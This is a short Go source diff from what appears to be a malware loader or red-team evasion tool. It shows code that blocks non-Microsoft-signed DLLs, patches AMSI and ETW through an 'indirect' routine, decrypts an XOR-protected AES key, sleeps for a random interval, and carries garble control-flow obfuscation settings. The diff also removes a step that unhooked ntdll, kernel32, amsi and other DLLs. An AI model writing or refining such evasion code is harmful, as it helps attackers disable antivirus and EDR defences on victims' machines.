@@ -12,7 +12,6 @@ import (
 	"main/utils/CleanMemory"
 	"main/utils/EVENT_LOG"
 	"main/utils/Indirect"
-	"main/utils/Unhook"
 	"main/utils/elevation"
 	"math/rand"
 	"time"
@@ -97,7 +96,7 @@ func decryptkey(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
-//from golang package docs
+// from golang package docs
 func Sleep() {
 	rand.Seed(time.Now().UnixNano())
 	seconds := rand.Intn(6) + 10
@@ -114,7 +113,7 @@ func Sleep() {
 	}
 }
 
-//garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
+//.garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
 func main() {
 	log.SetFlags(0)
 
@@ -148,16 +147,8 @@ func main() {
 	}
 	fmt.Println("[+] Non-Microsoft-signed DLLs blocked")
 
-	fmt.Println("[*] Unhooking DLLs")
-	dllsToUnhook := []string{"ntdll.dll", "kernel32.dll", "user32.dll", "advapi32.dll", "amsi.dll"}
-	if err := Unhook.FullUnhook(dllsToUnhook); err != nil {
-		log.Fatalf("[-] Failed to unhook DLLs: %v", err)
-		return
-	}
-	fmt.Println("[+] DLLs unhooked")
-
 	log.Printf("[*] Patching Amsi And ETW")
-	AMSI_EDR.ExecuteAllPatches()
+	AMSI_EDR.ExecuteAllPatchesIndirect()
 	log.Printf("[+] Patched Amsi And ETW")
 
 	DecryptedAESKEY, err := decryptkey(aesKey, XORAESKey)
